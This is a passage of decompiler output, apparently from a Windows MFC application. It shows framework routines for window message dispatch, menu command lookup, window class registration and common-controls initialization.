  ValueAt = CMapPtrToPtr::GetValueAt((struct CHandleMap *)((char *)v3 + 4), *(void **)(this + 28));
  v5 = *(_DWORD *)(this + 56);
  v6 = ValueAt;
  if ( v5 )
    v7 = (*(int (__thiscall **)(int))(*(_DWORD *)v5 + 80))(v5);
  else
    v7 = DestroyWindow(*(HWND *)(this + 28));
  v8 = v7;
  if ( !v6 )
    sub_417477((unsigned int *)this);
  return v8;
}

//----- (00417C92) --------------------------------------------------------
LRESULT __thiscall sub_417C92(void *this, UINT Msg, WPARAM wParam, LPARAM lParam)
{
  LRESULT (__stdcall *v5)(HWND, UINT, WPARAM, LPARAM); // eax

  v5 = (LRESULT (__stdcall *)(HWND, UINT, WPARAM, LPARAM))*((_DWORD *)this + 10);
  if ( v5 )
    return CallWindowProcA(v5, *((HWND *)this + 7), Msg, wParam, lParam);
  v5 = *(LRESULT (__stdcall **)(HWND, UINT, WPARAM, LPARAM))(*(int (__thiscall **)(void *))(*(_DWORD *)this + 128))(this);
  if ( v5 )
    return CallWindowProcA(v5, *((HWND *)this + 7), Msg, wParam, lParam);
  else
    return DefWindowProcA(*((HWND *)this + 7), Msg, wParam, lParam);
}

//----- (00417CD9) --------------------------------------------------------
char *__thiscall sub_417CD9(char *this)
{
  return this + 40;
}

//----- (00417CFC) --------------------------------------------------------
__int16 __stdcall sub_417CFC(int a1)
{
  struct _AFX_THREAD_STATE *ThreadState; // esi
  HWND v2; // eax
  int v3; // esi

  ThreadState = AfxGetThreadState();
  v2 = (HWND)*((_DWORD *)ThreadState + 51);
  if ( v2 )
  {
    v2 = (HWND)*((_DWORD *)v2 + 7);
    if ( v2 )
      LOWORD(v2) = SendMessageA(v2, 0x401u, 0, 0);
  }
  v3 = *((_DWORD *)ThreadState + 66);
  if ( a1 )
  {
    if ( v3 )
    {
      LOWORD(v2) = GetKeyState(1);
      if ( (__int16)v2 >= 0 )
        LOWORD(v2) = (*(int (__thiscall **)(int, int))(*(_DWORD *)v3 + 220))(v3, -1);
    }
  }
  return (__int16)v2;
}

//----- (00417DC4) --------------------------------------------------------
int __thiscall sub_417DC4(void *this, int a2, int a3)
{
  void *v4; // eax
  int result; // eax

  if ( *(_DWORD *)a3 == 1 )
  {
    v4 = sub_4199D2(*(void **)(a3 + 20));
    if ( v4 )
      return (*(int (__thiscall **)(void *, int))(*(_DWORD *)v4 + 12))(v4, a3);
  }
  else
  {
    result = sub_418AC5(*(HWND *)(a3 + 20), 0);
    if ( result )
      return result;
  }
  return sub_417360(this);
}

//----- (00417E76) --------------------------------------------------------
void *__stdcall sub_417E76(int a1, int a2)
{
  int MenuItemCount; // ebx
  int i; // edi
  HMENU SubMenu; // eax
  struct CObject *v5; // eax
  void *result; // eax

  MenuItemCount = GetMenuItemCount(*(HMENU *)(a1 + 4));
  for ( i = 0; i < MenuItemCount; ++i )
  {
    SubMenu = GetSubMenu(*(HMENU *)(a1 + 4), i);
    v5 = sub_4199BD(SubMenu);
    if ( v5 )
    {
      result = (void *)sub_417E76(v5, a2);
      if ( result )
        return result;
    }
    else if ( GetMenuItemID(*(HMENU *)(a1 + 4), i) == a2 )
    {
      return sub_4199D2(*(void **)(a1 + 4));
    }
  }
  return 0;
}

//----- (00417ED9) --------------------------------------------------------
int __thiscall sub_417ED9(HWND *this, int a2, _DWORD *a3)
{
  struct CNoTrackObject *Data; // eax
  struct CObject *v5; // eax
  void *v6; // eax
  struct CWnd *DescendantWindow; // eax
  int result; // eax
  HMENU Menu; // [esp-4h] [ebp-Ch]

  if ( *a3 == 1 )
  {
    Data = CThreadLocalObject::GetData((CThreadLocalObject *)&unk_442A6C, CThreadLocal<_AFX_THREAD_STATE>::CreateObject);
    if ( *((HWND *)Data + 20) == this[7] )
    {
      v5 = sub_4199BD(*((void **)Data + 21));
    }
    else
    {
      Menu = GetMenu(this[7]);
      v5 = sub_4199BD(Menu);
    }
    v6 = sub_417E76((int)v5, a3[2]);
    if ( v6 )
      (*(void (__thiscall **)(void *, _DWORD *))(*(_DWORD *)v6 + 16))(v6, a3);
    return sub_417360(this);
  }
  DescendantWindow = CWnd::GetDescendantWindow(this[7], a3[1], 1);
  if ( !DescendantWindow )
    return sub_417360(this);
  result = sub_418A98(DescendantWindow, 0);
  if ( !result )
    return sub_417360(this);
  return result;
}

//----- (00417F51) --------------------------------------------------------
int __stdcall sub_417F51(WNDCLASSA *lpWndClass)
{
  WNDCLASSA *v1; // esi
  CHAR *v3; // edi
  int v4; // [esp+0h] [ebp-48h] BYREF
  struct tagWNDCLASSA WndClass; // [esp+10h] [ebp-38h] BYREF
  int *v6; // [esp+38h] [ebp-10h]
  int v7; // [esp+44h] [ebp-4h]

  v1 = lpWndClass;
  v6 = &v4;
  if ( !GetClassInfoA(lpWndClass->hInstance, lpWndClass->lpszClassName, &WndClass) )
  {
    if ( !RegisterClassA(v1) )
      return 0;
    if ( *((_BYTE *)AfxGetModuleState() + 20) )
    {
      sub_41C3BC(1);
      v7 = 0;
      v3 = (char *)AfxGetModuleState() + 52;
      lstrcatA(v3, v1->lpszClassName);
      HIWORD(lpWndClass) = 10;
      lstrcatA(v3, (LPCSTR)&lpWndClass + 2);
      v7 = -1;
      AfxUnlockGlobals(1);
    }
  }
  return 1;
}

//----- (00418038) --------------------------------------------------------
int __thiscall sub_418038(HWND *this, ULONG_PTR dwData, UINT uCommand)
{
  struct CObject *v4; // esi
  HWND Capture; // eax
  int v7; // [esp+8h] [ebp-10h]

  v7 = *((_DWORD *)AfxGetModuleState() + 1);
  AfxGetModuleState();
  sub_416400();
  if ( (*((int (__thiscall **)(HWND *))*this + 44))(this) )
    (*((void (__thiscall **)(HWND *))*this + 60))(this);
  SendMessageA(this[7], 0x1Fu, 0, 0);
  CWnd::SendMessageToDescendants(this[7], 0x1Fu, 0, 0, 1, 1);
  v4 = sub_4188CC(this);
  SendMessageA(*((HWND *)v4 + 7), 0x1Fu, 0, 0);
  CWnd::SendMessageToDescendants(*((HWND *)v4 + 7), 0x1Fu, 0, 0, 1, 1);
  Capture = GetCapture();
  if ( Capture )
    SendMessageA(Capture, 0x1Fu, 0, 0);
  if ( !WinHelpA(*((HWND *)v4 + 7), *(LPCSTR *)(v7 + 140), uCommand, dwData) )
    sub_41A9DF(0xF107u, 0, -1);
  AfxGetModuleState();
  return sub_416415();
}

//----- (0041811A) --------------------------------------------------------
void **sub_41811A()
{
  return &off_41F9A0;
}
// 41F9A0: using guessed type void *off_41F9A0;

//----- (00418160) --------------------------------------------------------
int __thiscall sub_418160(void *this, int a2, int a3, int a4)
{
  int v6; // [esp+4h] [ebp-4h] BYREF

  v6 = 0;
  if ( !(*(int (__thiscall **)(void *, int, int, int, int *))(*(_DWORD *)this + 156))(this, a2, a3, a4, &v6) )
    return (*(int (__thiscall **)(void *, int, int, int))(*(_DWORD *)this + 160))(this, a2, a3, a4);
  return v6;
}

//----- (004181A4) --------------------------------------------------------
int __thiscall sub_4181A4(struct CWnd *this, unsigned int a2, WPARAM wParam, unsigned int a4, _DWORD *a5)
{
  int v6; // eax
  struct CWnd *v8; // eax
  int v9; // ebx
  unsigned int v10; // ecx
  bool v11; // zf
  unsigned int *v12; // ebx
  int *v13; // eax
  _DWORD *v14; // ebx
  _DWORD *v15; // eax
  _DWORD **v16; // eax
  _DWORD *v18; // ecx
  int (__thiscall *v19)(struct CWnd *, struct CObject *); // ebx
  int v20; // eax
  unsigned __int8 Version; // al
  int v22; // eax
  int v23; // eax
  struct CObject *v24; // eax
  struct CObject *v25; // eax
  int v26; // eax
  void *v27; // eax
  int v28; // esi
  _DWORD *v29; // eax
  int v30; // eax
  void *ValueAt; // eax
  int v32; // eax
  int v33; // eax
  struct CObject *v34; // eax
  struct CObject *v35; // eax
  int v36; // eax
  struct CObject *v37; // eax
  struct CObject *v38; // eax
  struct CObject *v39; // eax
  struct CObject *v40; // eax
  int v41; // edx
  int v42; // eax
  struct CObject *v43; // [esp-8h] [ebp-74h]
  struct CObject *v44; // [esp-8h] [ebp-74h]
  struct CObject *v45; // [esp-4h] [ebp-70h]
  unsigned int v46; // [esp-4h] [ebp-70h]
  WPARAM v47; // [esp-4h] [ebp-70h]
  int v48; // [esp-4h] [ebp-70h]
  unsigned int v49; // [esp-4h] [ebp-70h]
  unsigned int v50; // [esp-4h] [ebp-70h]
  struct CObject *v51; // [esp-4h] [ebp-70h]
  struct CObject *v52; // [esp-4h] [ebp-70h]
  struct CObject *v53; // [esp-4h] [ebp-70h]
  _DWORD v54[7]; // [esp+Ch] [ebp-60h] BYREF
  void *v55; // [esp+28h] [ebp-44h]
  void *v56; // [esp+44h] [ebp-28h]
  unsigned int v57; // [esp+48h] [ebp-24h] BYREF
  int v58; // [esp+4Ch] [ebp-20h]
  int *v59; // [esp+58h] [ebp-14h]
  int v60; // [esp+5Ch] [ebp-10h] BYREF
  int v61; // [esp+68h] [ebp-4h]
  int v62; // [esp+74h] [ebp+8h]
  WPARAM wParama; // [esp+78h] [ebp+Ch]
  _DWORD *v64; // [esp+7Ch] [ebp+10h]
  _DWORD **v65; // [esp+7Ch] [ebp+10h]

  v60 = 0;
  switch ( a2 )
  {
    case 0x111u:
      if ( (*(int (__thiscall **)(struct CWnd *, WPARAM, unsigned int))(*(_DWORD *)this + 120))(this, wParam, a4) )
      {
LABEL_90:
        v60 = 1;
        goto LABEL_96;
      }
      return 0;
    case 0x4Eu:
      if ( *(_DWORD *)a4 )
      {
        v6 = (*(int (__thiscall **)(struct CWnd *, WPARAM, unsigned int, int *))(*(_DWORD *)this + 124))(
               this,
               wParam,
               a4,
               &v60);
LABEL_7:
        if ( v6 )
          goto LABEL_96;
      }
      return 0;
    case 6u:
      v8 = sub_4173F9((void *)a4);
      _AfxHandleActivate(this, wParam, v8);
      break;
  }
  if ( a2 == 32 && _AfxHandleSetCursor(this, (__int16)a4, HIWORD(a4)) )
    goto LABEL_90;
  v59 = (int *)(*(int (__thiscall **)(struct CWnd *))(*(_DWORD *)this + 40))(this);
  v9 = a2 & 0x1FF ^ (unsigned __int16)v59 & 0x1FF;
  sub_41C3BC(7);
  v10 = a2;
  v11 = a2 == dword_442C30[3 * v9];
  v12 = (unsigned int *)(12 * v9 + 4467760);
  v13 = v59;
  if ( v11 && v59 == (int *)v12[2] )
  {
    v14 = (_DWORD *)v12[1];
    v64 = v14;
    AfxUnlockGlobals(7);
    if ( !v14 )
      return 0;
    if ( a2 >= 0xC000 )
      goto LABEL_93;
LABEL_33:
    v18 = v64;
    v19 = (int (__thiscall *)(struct CWnd *, struct CObject *))v14[5];
    v20 = v64[4];
    if ( v64[2] == 26 )
    {
      Version = GetVersion();
      v18 = v64;
      v22 = -(Version < 4u);
      LOBYTE(v22) = v22 & 0xF0;
      v20 = v22 + 47;
    }
    switch ( v20 )
    {
      case 1:
        v45 = sub_419B5B((void *)wParam);
        v23 = v19(this, v45);
        goto LABEL_95;
      case 2:
        v23 = v19(this, (struct CObject *)wParam);
        goto LABEL_95;
      case 3:
      case 8:
        v46 = HIWORD(a4);
        v43 = (struct CObject *)(__int16)a4;
        v24 = sub_4173F9((void *)wParam);
        goto LABEL_54;
      case 4:
        CDC::CDC((CDC *)&v57);
        v26 = *(_DWORD *)(a4 + 4);
        v61 = 0;
        v58 = v26;
        sub_417051(v54);
        v27 = *(void **)a4;
        v28 = *(_DWORD *)(a4 + 8);
        LOBYTE(v61) = 1;
        v55 = v27;
        v29 = sub_417420(v27);
        if ( !v29 )
        {
          v30 = *((_DWORD *)this + 13);
          if ( v30 )
          {
            ValueAt = CMapPtrToPtr::GetValueAt((CMapPtrToPtr *)(v30 + 32), v55);
            if ( ValueAt )
              v56 = ValueAt;
          }
          v29 = v54;
        }
        v32 = ((int (__thiscall *)(struct CWnd *, unsigned int *, _DWORD *, int))v19)(this, &v57, v29, v28);
        v58 = 0;
        v55 = 0;
        LOBYTE(v61) = 0;
        v60 = v32;
        CWnd::~CWnd((CWnd *)v54);
        v61 = -1;
        goto LABEL_47;
      case 5:
        CDC::CDC((CDC *)&v57);
        v48 = *(_DWORD *)(a4 + 8);
        v58 = *(_DWORD *)(a4 + 4);
        v61 = 2;
        v33 = ((int (__thiscall *)(struct CWnd *, unsigned int *, int))v19)(this, &v57, v48);
        v58 = 0;
        v61 = -1;
        v60 = v33;
LABEL_47:
        sub_419BA1(&v57);
        goto LABEL_96;
      case 6:
        v46 = HIWORD(wParam);
        v34 = sub_4173F9((void *)a4);
        goto LABEL_53;
      case 7:
        v47 = HIWORD(wParam);
        v25 = (struct CObject *)(unsigned __int16)wParam;
        goto LABEL_81;
      case 9:
      case 42:
        v23 = v19(this, (struct CObject *)a4);
        goto LABEL_95;
      case 10:
      case 33:
        goto LABEL_94;
      case 11:
        v46 = (unsigned int)sub_4199BD((void *)a4);
        v34 = (struct CObject *)HIWORD(wParam);
LABEL_53:
        v43 = v34;
        v24 = (struct CObject *)(unsigned __int16)wParam;
LABEL_54:
        v23 = ((int (__thiscall *)(struct CWnd *, struct CObject *, struct CObject *, unsigned int))v19)(
                this,
                v24,
                v43,
                v46);
        goto LABEL_95;
      case 12:
        ((void (__thiscall *)(struct CWnd *))v19)(this);
        goto LABEL_96;
      case 13:
        v19(this, (struct CObject *)wParam);
        goto LABEL_96;
      case 14:
      case 18:
      case 37:
      case 47:
        v52 = (struct CObject *)a4;
        goto LABEL_79;
      case 15:
        v49 = SHIWORD(a4);
        v35 = (struct CObject *)(__int16)a4;
        goto LABEL_58;
      case 16:
      case 17:
        v50 = HIWORD(a4);
        v36 = (unsigned __int16)a4;
        goto LABEL_88;
      case 19:
        v51 = sub_4173F9((void *)wParam);
        v44 = sub_4173F9((void *)a4);
        v37 = (struct CObject *)(*((_DWORD *)this + 7) == a4);
        goto LABEL_61;
      case 20:
        v38 = sub_419B5B((void *)wParam);
        goto LABEL_63;
      case 21:
        v38 = sub_4199BD((void *)wParam);
        goto LABEL_63;
      case 22:
        v51 = (struct CObject *)HIWORD(a4);
        v44 = (struct CObject *)(unsigned __int16)a4;
        v37 = sub_4199BD((void *)wParam);
        goto LABEL_61;
      case 23:
        v38 = sub_4173F9((void *)wParam);
        goto LABEL_63;
      case 24:
        v51 = (struct CObject *)HIWORD(a4);
        v39 = (struct CObject *)(unsigned __int16)a4;
        goto LABEL_71;
      case 25:
        v39 = (struct CObject *)(__int16)a4;
        v51 = (struct CObject *)SHIWORD(a4);
LABEL_71:
        v44 = v39;
        v37 = sub_4173F9((void *)wParam);
        goto LABEL_61;
      case 26:
        v49 = a4;
        v35 = sub_4173F9((void *)wParam);
LABEL_58:
        ((void (__thiscall *)(struct CWnd *, struct CObject *, unsigned int))v19)(this, v35, v49);
        goto LABEL_96;
      case 27:
        v52 = sub_4173F9((void *)a4);
LABEL_79:
        ((void (__thiscall *)(struct CWnd *, WPARAM, struct CObject *))v19)(this, wParam, v52);
        goto LABEL_96;
      case 28:
        v51 = (struct CObject *)HIWORD(wParam);
        v40 = sub_4173F9((void *)a4);
        goto LABEL_86;
      case 29:
      case 30:
        v41 = (__int16)wParam;
        v62 = (__int16)wParam;
        v42 = SHIWORD(wParam);
        wParama = SHIWORD(wParam);
        if ( v18[4] == 29 )
        {
          v53 = sub_4173F9((void *)a4);
          ((void (__thiscall *)(struct CWnd *, int, WPARAM, struct CObject *))v19)(this, v62, wParama, v53);
        }
        else
        {
          ((void (__thiscall *)(struct CWnd *, int, int))v19)(this, v41, v42);
        }
        goto LABEL_96;
      case 31:
      case 36:
        v19(this, (struct CObject *)a4);
        goto LABEL_96;
      case 32:
      case 43:
        ((void (__thiscall *)(struct CWnd *, WPARAM, unsigned int))v19)(this, wParam, a4);
        goto LABEL_90;
      case 34:
        v25 = (struct CObject *)(__int16)a4;
        v47 = SHIWORD(a4);
        goto LABEL_81;
      case 35:
        v23 = ((int (__thiscall *)(struct CWnd *))v19)(this);
        goto LABEL_95;
      case 44:
        v38 = sub_4173F9((void *)a4);
LABEL_63:
        v19(this, v38);
        goto LABEL_96;
      case 45:
        v47 = a4;
        v25 = sub_4173F9((void *)wParam);
LABEL_81:
        v23 = ((int (__thiscall *)(struct CWnd *, struct CObject *, WPARAM))v19)(this, v25, v47);
        goto LABEL_95;
      case 46:
        v6 = ((int (__thiscall *)(struct CWnd *, _DWORD, WPARAM, _DWORD, unsigned int))v19)(
               this,
               (unsigned __int16)wParam,
               HIWORD(wParam),
               (unsigned __int16)a4,
               HIWORD(a4));
        v60 = v6;
        goto LABEL_7;
      case 48:
        v51 = (struct CObject *)a4;
        v40 = (struct CObject *)HIWORD(wParam);
LABEL_86:
        v44 = v40;
        v37 = (struct CObject *)(unsigned __int16)wParam;
LABEL_61:
        ((void (__thiscall *)(struct CWnd *, struct CObject *, struct CObject *, struct CObject *))v19)(
          this,
          v37,
          v44,
          v51);
        goto LABEL_96;
      case 49:
        v36 = (__int16)a4;
        v50 = SHIWORD(a4);
LABEL_88:
        ((void (__thiscall *)(struct CWnd *, WPARAM, int, unsigned int))v19)(this, wParam, v36, v50);
        goto LABEL_96;
      default:
        goto LABEL_96;
    }
  }
  *v12 = a2;
  v12[2] = (unsigned int)v13;
  if ( !v13 )
  {
LABEL_30:
    v12[1] = 0;
    AfxUnlockGlobals(7);
    return 0;
  }
  while ( v10 < 0xC000 )
  {
    v15 = (_DWORD *)unknown_libname_24(v13[1], v10, 0, 0);
    v64 = v15;
    if ( v15 )
    {
      v12[1] = (unsigned int)v15;
      AfxUnlockGlobals(7);
      v14 = v64;
      goto LABEL_33;
    }
LABEL_29:
    v59 = (int *)*v59;
    if ( !v59 )
      goto LABEL_30;
    v13 = v59;
    v10 = a2;
  }
  v16 = (_DWORD **)unknown_libname_24(v13[1], 49152, 0, 0);
  v65 = v16;
  if ( !v16 )
    goto LABEL_29;
  while ( *v16[4] != a2 )
  {
    v65 = (_DWORD **)unknown_libname_24(v16 + 6, 49152, 0, 0);
    if ( !v65 )
      goto LABEL_29;
    v16 = v65;
  }
  v12[1] = (unsigned int)v16;
  AfxUnlockGlobals(7);
  v14 = v65;
LABEL_93:
  v19 = (int (__thiscall *)(struct CWnd *, struct CObject *))v14[5];
LABEL_94:
  v23 = ((int (__thiscall *)(struct CWnd *, WPARAM, unsigned int))v19)(this, wParam, a4);
LABEL_95:
  v60 = v23;
LABEL_96:
  if ( a5 )
    *a5 = v60;
  return 1;
}
// 418120: using guessed type _DWORD __stdcall unknown_libname_24(_DWORD, _DWORD, _DWORD, _DWORD);
// 442C30: using guessed type int dword_442C30[1536];
// 4181A4: using guessed type _DWORD var_60[7];

//----- (00418716) --------------------------------------------------------
CCmdUI *__thiscall sub_418716(CCmdUI *this)
{
  CCmdUI::CCmdUI(this);
  *(_DWORD *)this = &CTestCmdUI::`vftable';
  *((_DWORD *)this + 10) = 1;
  return this;
}
// 41FE10: using guessed type void *CTestCmdUI::`vftable';

//----- (00418849) --------------------------------------------------------
HWND *__thiscall sub_418849(HWND *this)
{
  HWND i; // eax
  HWND *v2; // esi

  if ( this && this[7] )
  {
    for ( i = GetParent(this[7]); ; i = GetParent(v2[7]) )
    {
      v2 = (HWND *)sub_4173F9(i);
      if ( !v2 )
        break;
      if ( (*((int (__thiscall **)(HWND *))*v2 + 44))(v2) )
        return v2;
    }
  }
  return 0;
}

//----- (004188CC) --------------------------------------------------------
struct CObject *__thiscall sub_4188CC(_DWORD *this)
{
  HWND ParentOwner; // eax
  HWND v3; // esi

  if ( !this )
    return 0;
  ParentOwner = (HWND)this[7];
  if ( !ParentOwner )
    return 0;
  do
  {
    v3 = ParentOwner;
    ParentOwner = AfxGetParentOwner(ParentOwner);
  }
  while ( ParentOwner );
  return sub_4173F9(v3);
}

//----- (004188F4) --------------------------------------------------------
HWND *__thiscall sub_4188F4(HWND *this)
{
  HWND *v1; // esi
  HWND *i; // ecx
  HWND *v4; // eax

  v1 = this;
  if ( !this || !this[7] )
    return 0;
  if ( !(*((int (__thiscall **)(HWND *))*this + 44))(this) )
    v1 = sub_418849(v1);
  if ( v1 )
  {
    for ( i = v1; ; i = v4 )
    {
      v4 = sub_418849(i);
      if ( !v4 )
        break;
      v1 = v4;
    }
  }
  return v1;
}

//----- (00418A56) --------------------------------------------------------
int __stdcall sub_418A56(HWND a1, HWND *a2)
{
  HWND i; // esi
  void *v3; // eax

  for ( i = *a2; i; i = GetParent(i) )
  {
    v3 = sub_417420(i);
    if ( v3 && (*(int (__thiscall **)(void *, HWND *))(*(_DWORD *)v3 + 144))(v3, a2) )
      return 1;
    if ( i == a1 )
      break;
  }
  return 0;
}

//----- (00418A98) --------------------------------------------------------
int __thiscall sub_418A98(void *this, int a2)
{
  struct CNoTrackObject *Data; // eax

  Data = CThreadLocalObject::GetData((CThreadLocalObject *)&unk_442A6C, CThreadLocal<_AFX_THREAD_STATE>::CreateObject);
  return (*(int (__thiscall **)(void *, _DWORD, _DWORD, _DWORD, int))(*(_DWORD *)this + 168))(
           this,
           *((_DWORD *)Data + 14),
           *((_DWORD *)Data + 15),
           *((_DWORD *)Data + 16),
           a2);
}

//----- (00418AC5) --------------------------------------------------------
int __stdcall sub_418AC5(HWND hWnd, int a2)
{
  struct CHandleMap *v2; // eax
  CMapPtrToPtr *v3; // esi
  void *ValueAt; // eax
  HWND Parent; // eax
  _DWORD *v6; // eax
  int v7; // eax
  void *v8; // esi
  int v9; // eax
  int v10; // esi
  _DWORD v12[15]; // [esp+8h] [ebp-48h] BYREF
  int v13; // [esp+4Ch] [ebp-4h]

  v2 = afxMapHWND(0);
  if ( !v2 )
    return 0;
  v3 = (struct CHandleMap *)((char *)v2 + 4);
  ValueAt = CMapPtrToPtr::GetValueAt((struct CHandleMap *)((char *)v2 + 4), hWnd);
  if ( !ValueAt )
  {
    Parent = GetParent(hWnd);
    v6 = CMapPtrToPtr::GetValueAt(v3, Parent);
    if ( v6 )
    {
      v7 = v6[13];
      if ( v7 )
      {
        v8 = CMapPtrToPtr::GetValueAt((CMapPtrToPtr *)(v7 + 32), hWnd);
        if ( v8 )
        {
          sub_41708F(v12, (int)hWnd);
          v13 = 0;
          v12[14] = v8;
          v9 = sub_418A98(v12, a2);
          v12[7] = 0;
          v13 = -1;
          v10 = v9;
          CWnd::~CWnd((CWnd *)v12);
          return v10;
        }
      }
    }
    return 0;
  }
  return sub_418A98(ValueAt, a2);
}

//----- (00418BC4) --------------------------------------------------------
int __thiscall sub_418BC4(struct CWnd *this, unsigned int a2, WPARAM wParam, int a4, _DWORD *a5)
{
  int result; // eax
  int v6; // [esp+4h] [ebp-Ch] BYREF
  _DWORD *Buf1; // [esp+8h] [ebp-8h] BYREF
  unsigned int v8; // [esp+Ch] [ebp-4h]

  if ( a2 > 0x111 )
  {
    if ( a2 < 0x114 || a2 > 0x115 && a2 != 528 )
      goto LABEL_15;
    return sub_4181A4(this, a2 + 48128, wParam, a4, a5);
  }
  if ( a2 != 273 )
  {
    if ( a2 < 0x2B )
      goto LABEL_15;
    if ( a2 > 0x2F && a2 != 57 )
    {
      if ( a2 == 78 )
      {
        Buf1 = a5;
        v8 = a4;
        return sub_4162DE(this, 0, (unsigned __int16)*(_DWORD *)(a4 + 8) | 0xBC4E0000, &Buf1, 0);
      }
LABEL_15:
      if ( a2 < 0x132 )
        return 0;
      if ( a2 > 0x138 )
        return 0;
      v8 = a2 - 306;
      Buf1 = (_DWORD *)wParam;
      result = sub_4181A4(this, 0xBC19u, 0, (unsigned int)&v6, a5);
      if ( !*a5 )
        return 0;
      return result;
    }
    return sub_4181A4(this, a2 + 48128, wParam, a4, a5);
  }
  if ( !sub_4162DE(this, 0, HIWORD(wParam) | 0xBD110000, 0, 0) )
    return 0;
  result = 1;
  if ( a5 )
    *a5 = 1;
  return result;
}

//----- (004191A9) --------------------------------------------------------
int sub_4191A9()
{
  return 1;
}

//----- (00419219) --------------------------------------------------------
HMODULE __stdcall sub_419219(const INITCOMMONCONTROLSEX *a1, int a2)
{
  HMODULE ModuleHandleA; // edi
  HMODULE result; // eax
  HMODULE v4; // ebx
  int v5; // esi
  BOOL (__stdcall *InitCommonControlsEx)(const INITCOMMONCONTROLSEX *); // eax

  ModuleHandleA = GetModuleHandleA("COMCTL32.DLL");
  result = LoadLibraryA("COMCTL32.DLL");
  v4 = result;
  if ( result )
  {
    v5 = 0;
    InitCommonControlsEx = (BOOL (__stdcall *)(const INITCOMMONCONTROLSEX *))GetProcAddress(
                                                                               result,
                                                                               "InitCommonControlsEx");
    if ( InitCommonControlsEx )
    {
      if ( InitCommonControlsEx(a1) )
      {
        v5 = a2;
        if ( !ModuleHandleA )
        {
          InitCommonControls();
          LOWORD(v5) = a2 | 0x3FC0;
        }
      }
    }
    else if ( (a2 & 0x3FC0) == a2 )
    {
      InitCommonControls();
      v5 = 16320;
    }
    FreeLibrary(v4);
    return (HMODULE)v5;
  }
  return result;
}

//----- (00419290) --------------------------------------------------------
BOOL __stdcall sub_419290(int a1)
{
  int v2; // esi
  struct AFX_MODULE_STATE *v3; // ecx
  int v4; // eax
  WNDCLASSA WndClass; // [esp+0h] [ebp-34h] BYREF
  INITCOMMONCONTROLSEX v6; // [esp+28h] [ebp-Ch] BYREF
  struct AFX_MODULE_STATE *ModuleState; // [esp+30h] [ebp-4h]
  int v8; // [esp+3Ch] [ebp+8h]

  ModuleState = AfxGetModuleState();
  v8 = ~*((_DWORD *)ModuleState + 6) & a1;
  if ( !v8 )
    return 1;
  v2 = 0;
  memset(&WndClass, 0, sizeof(WndClass));
  WndClass.lpfnWndProc = DefWindowProcA;
  WndClass.hInstance = (HINSTANCE)*((_DWORD *)AfxGetModuleState() + 2);
  WndClass.hCursor = (HCURSOR)dword_4447B0;
  v6.dwSize = 8;
  if ( (v8 & 1) != 0 )
  {
    WndClass.style = 11;
    WndClass.lpszClassName = "AfxWnd42s";
    v2 = sub_417F51(&WndClass) != 0;
  }
  if ( (v8 & 0x20) != 0 )
  {
    LOBYTE(WndClass.style) |= 0x8Bu;
    WndClass.lpszClassName = "AfxOleControl42s";
    if ( sub_417F51(&WndClass) )
      v2 |= 0x20u;
  }
  if ( (v8 & 2) != 0 )
  {
    WndClass.style = 0;
    WndClass.lpszClassName = "AfxControlBar42s";
    WndClass.hbrBackground = (HBRUSH)16;
    if ( sub_417F51(&WndClass) )
      v2 |= 2u;
  }
  if ( (v8 & 4) != 0 )
  {
    WndClass.style = 8;
    WndClass.hbrBackground = 0;
    if ( unknown_libname_30(&WndClass, (int)"AfxMDIFrame42s", 31233) )
      v2 |= 4u;
  }
  if ( (v8 & 8) != 0 )
  {
    WndClass.style = 11;
    WndClass.hbrBackground = (HBRUSH)6;
    if ( unknown_libname_30(&WndClass, (int)"AfxFrameOrView42s", 31234) )
      v2 |= 8u;
  }
  if ( (v8 & 0x10) != 0 )
  {
    v6.dwICC = 255;
    v2 |= (unsigned int)sub_419219(&v6, 16320);
    LOWORD(v8) = v8 & 0xC03F;
  }
  if ( (v8 & 0x40) != 0 )
  {
    v6.dwICC = 16;
    v2 |= (unsigned int)sub_419219(&v6, 64);
  }
  if ( (v8 & 0x80u) != 0 )
  {
    v6.dwICC = 2;
    v2 |= (unsigned int)sub_419219(&v6, 128);
  }
  if ( (v8 & 0x100) != 0 )
  {
    v6.dwICC = 8;
    v2 |= (unsigned int)sub_419219(&v6, 256);
  }
  if ( (v8 & 0x200) != 0 )
  {
    v6.dwICC = 32;
    v2 |= (unsigned int)sub_419219(&v6, 512);
  }
  if ( (v8 & 0x400) != 0 )
  {
    v6.dwICC = 1;
    v2 |= (unsigned int)sub_419219(&v6, 1024);
  }
  if ( (v8 & 0x800) != 0 )
  {
    v6.dwICC = 64;
    v2 |= (unsigned int)sub_419219(&v6, 2048);
  }
  if ( (v8 & 0x1000) != 0 )
  {
    v6.dwICC = 4;
    v2 |= (unsigned int)sub_419219(&v6, 4096);
  }
  if ( (v8 & 0x2000) != 0 )
  {
    v6.dwICC = 128;
    v2 |= (unsigned int)sub_419219(&v6, 0x2000);
  }
  if ( (v8 & 0x4000) != 0 )
  {
    v6.dwICC = 2048;
    v2 |= (unsigned int)sub_419219(&v6, 0x4000);
  }
  if ( (v8 & 0x8000) != 0 )
  {
    v6.dwICC = 1024;
    v2 |= (unsigned int)sub_419219(&v6, 0x8000);
  }
  if ( (v8 & 0x10000) != 0 )
  {
    v6.dwICC = 512;
    v2 |= (unsigned int)sub_419219(&v6, 0x10000);
  }
  if ( (v8 & 0x20000) != 0 )
  {
    v6.dwICC = 256;
    v2 |= (unsigned int)sub_419219(&v6, 0x20000);
  }
  v3 = ModuleState;
  *((_DWORD *)ModuleState + 6) |= v2;
  v4 = *((_DWORD *)v3 + 6);
  if ( (v4 & 0x3FC0) == 16320 )
  {
    LOBYTE(v4) = v4 | 0x10;
    v2 |= 0x10u;
    *((_DWORD *)v3 + 6) = v4;
  }
  return v8 == (v8 & v2);
}
// 4447B0: using guessed type int dword_4447B0;

//----- (00419547) --------------------------------------------------------
int sub_419547()
{
  return 0;
}

//----- (00419569) --------------------------------------------------------
void __cdecl sub_419569(_DWORD *a1)
{
  sub_40A5C5((int)&unk_444430, a1);
}

//----- (004196C8) --------------------------------------------------------
BOOL __stdcall sub_4196C8(size_t Size)
{
  struct AFX_MODULE_THREAD_STATE *ModuleThreadState; // ebx
  int v2; // eax
  int v3; // eax
  struct CWinThread *Thread; // eax
  void (__stdcall *v5)(_DWORD, _DWORD); // eax
  int v6; // edi
  struct CNoTrackObject *Data; // eax
  struct CNoTrackObject *v8; // esi
  _DWORD *v9; // eax
  void *v10; // eax
  SIZE_T Sizea; // [esp+14h] [ebp+8h]

  ModuleThreadState = AfxGetModuleThreadState();
  v2 = *((_DWORD *)ModuleThreadState + 4);
  if ( v2 )
  {
    v3 = v2 - 1;
    *((_DWORD *)ModuleThreadState + 4) = v3;
